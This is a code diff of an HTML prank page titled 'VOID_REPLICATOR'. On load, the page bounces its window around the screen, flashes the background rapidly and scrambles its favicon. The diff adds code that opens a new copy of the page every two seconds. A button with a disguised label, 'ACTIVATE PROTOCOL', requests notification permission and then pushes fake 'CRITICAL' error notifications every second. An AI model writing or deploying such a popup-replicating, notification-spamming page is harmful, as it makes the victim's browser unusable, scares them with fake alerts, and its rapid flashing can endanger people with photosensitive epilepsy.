@@ -1,94 +1,62 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>GLITCH_UNIT</title>
+    <title>VOID_REPLICATOR</title>
     <link id="icon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
-    
     <style>
-        body { 
-            background: #000; 
-            margin: 0; 
-            overflow: hidden; 
-            height: 100vh; 
-            width: 100vw; 
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        /* High-speed Glitch Background */
-        #glitch {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #fff; z-index: 1;
-            animation: flash 0.04s infinite;
-        }
-
-        @keyframes flash {
-            0% { background: #fff; clip-path: inset(0 0 0 0); }
-            50% { background: #000; clip-path: polygon(10% 0, 90% 0, 100% 100%, 0% 100%); }
-            100% { background: #444; clip-path: polygon(50% 0, 100% 50%, 50% 100%, 0 50%); }
-        }
-
-        button {
-            position: relative; z-index: 10;
-            padding: 20px; font-family: monospace; 
-            font-weight: bold; cursor: pointer;
-            background: #fff; border: 2px solid #000;
-        }
+        body { background: #000; margin: 0; overflow: hidden; height: 100vh; width: 100vw; display: flex; align-items: center; justify-content: center; }
+        #glitch { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; animation: flash 0.04s infinite; }
+        @keyframes flash { 0% { background: #fff; } 50% { background: #000; } 100% { background: #444; } }
+        button { position: relative; z-index: 10; padding: 20px; font-family: monospace; font-weight: bold; cursor: pointer; }
     </style>
 </head>
-<body onload="startBouncing()">
+<body onload="init()">
 
     <div id="glitch"></div>
-    <button id="authBtn" onclick="enableSpam()">ALLOW NOTIF_SPAM</button>
+    <button id="authBtn" onclick="enableSpam()">ACTIVATE PROTOCOL</button>
 
     <script>
-        // 1. BOUNCING LOGIC
         let x = Math.random() * (screen.availWidth - 400);
         let y = Math.random() * (screen.availHeight - 400);
-        let dx = 12; // Speed X
-        let dy = 12; // Speed Y
+        let dx = 10, dy = 10;
 
-        function startBouncing() {
+        function init() {
+            // 1. BOUNCING
             setInterval(() => {
-                x += dx;
-                y += dy;
-
-                // Bounce off screen edges
+                x += dx; y += dy;
                 if (x + 400 > screen.availWidth || x < 0) dx = -dx;
                 if (y + 400 > screen.availHeight || y < 0) dy = -dy;
-
                 window.moveTo(x, y);
             }, 30);
+
+            // 2. ICON GLITCH
+            setInterval(() => {
+                const p = () => Math.floor(Math.random() * 100);
+                document.getElementById('icon').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
+            }, 50);
+
+            // 3. REPLICATION (The "Open Again" Logic)
+            // This window will spawn a new copy of itself every 2 seconds
+            setInterval(() => {
+                const newX = Math.random() * (screen.availWidth - 400);
+                const newY = Math.random() * (screen.availHeight - 400);
+                window.open('notifacations.html', '_blank', `width=400,height=400,left=${newX},top=${newY}`);
+            }, 2000); 
         }
 
-        // 2. ICON GLITCH
-        setInterval(() => {
-            const p = () => Math.floor(Math.random() * 100);
-            document.getElementById('icon').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
-        }, 50);
-
-        // 3. NOTIFICATION SPAMMER
-        const lexicon = ["VOID", "NULL", "ERROR", "SIGNAL", "BREACH", "FATAL", "DATA", "LOST", "0xFF", "STACK", "CORRUPT"];
-
+        // 4. NOTIFICATION SPAMMER
+        const lexicon = ["VOID", "NULL", "ERROR", "SIGNAL", "BREACH", "FATAL", "DATA", "LOST"];
         async function enableSpam() {
             const permission = await Notification.requestPermission();
             if (permission === 'granted') {
                 document.getElementById('authBtn').style.display = 'none';
-                
                 setInterval(() => {
-                    // Generate 1-10 random words
-                    let wordCount = Math.floor(Math.random() * 10) + 1;
                     let sentence = "";
-                    for(let i=0; i < wordCount; i++) {
+                    for(let i=0; i < (Math.floor(Math.random()*10)+1); i++) {
                         sentence += lexicon[Math.floor(Math.random() * lexicon.length)] + " ";
                     }
-
-                    new Notification("CRITICAL_ERROR", { 
-                        body: sentence.trim(),
-                        silent: true 
-                    });
-                }, 1000); // Send every 1 second
+                    new Notification("CRITICAL", { body: sentence.trim(), silent: true });
+                }, 1000);
             }
         }
     </script>
